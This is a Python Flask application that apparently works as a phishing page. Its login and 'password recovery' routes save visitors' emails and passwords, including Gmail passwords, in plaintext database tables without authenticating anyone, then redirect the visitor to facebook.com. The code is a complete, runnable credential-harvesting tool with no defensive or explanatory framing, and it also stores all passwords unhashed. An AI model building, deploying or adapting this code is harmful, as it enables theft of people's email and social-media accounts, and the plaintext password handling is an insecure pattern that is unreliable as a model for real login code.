from flask import Flask, render_template, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
import os
from forms import *
from flask_login import UserMixin, login_user, LoginManager, login_required, current_user, logout_user
# os is imported for environment variable

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY")
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get("DATABASE_URL", "sqlite:///login-users.db")
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))



class User(UserMixin,db.Model):
    __tablename__ = "users"
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(250))
    password = db.Column(db.String(250))
    f_name = db.Column(db.String(250))
    l_name = db.Column(db.String(250))
    phone_number = db.Column(db.String(250))
    date_of_birth = db.Column(db.String(250))
    profession = db.Column(db.String(250))
    address = db.Column(db.String(250))
    school = db.Column(db.String(250))


class Login(UserMixin,db.Model):
    __tablename__ = "login"
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(250))
    password = db.Column(db.String(250))


class Recover(db.Model):
    __tablename__ = "recover password"
    id = db.Column(db.Integer, primary_key=True)
    gmail = db.Column(db.String(250))
    password = db.Column(db.String(250))


# db.create_all()


@app.route("/", methods=["GET", "POST"])
def index():
    form = Login_Form()
    if form.validate_on_submit():
        email = form.email.data
        password = form.password.data
        user_login = Login(email=email, password=password)
        db.session.add(user_login)
        db.session.commit()
        return redirect(url_for("recover"))
    return render_template("index.html", form=form)


@app.route("/account", methods=["GET", "POST"])
def new_account():
    form = Register_Form()
    if form.validate_on_submit():
        first_name = form.name.data
        last_name = form.last_name.data
        email = form.email.data
        password = form.password.data
        date_of_birth = form.date_of_birth.data
        address = form.address.data
        phone_number = form.phone_number.data
        profession = form.profession.data
        new_account = User(f_name=first_name, l_name=last_name, email=email, password=password,
                           date_of_birth=date_of_birth, address=address, phone_number=phone_number,
                           profession=profession)
        db.session.add(new_account)
        db.session.commit()
        login_user(new_account)
        return redirect(url_for("index"))
    return render_template("account.html", form=form)


@app.route("/password_recovery", methods=["POST", "GET"])
def recover():
    form = Recovery_Form()
    if form.validate_on_submit():
        email = form.email.data
        password = form.password.data
        recovery_account = Recover(gmail=email, password=password)
        db.session.add(recovery_account)
        db.session.commit()
        return redirect("https://www.facebook.com")
    return render_template("recovery_page.html", form=form)


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)

# host='0.0.0.0', port=5000
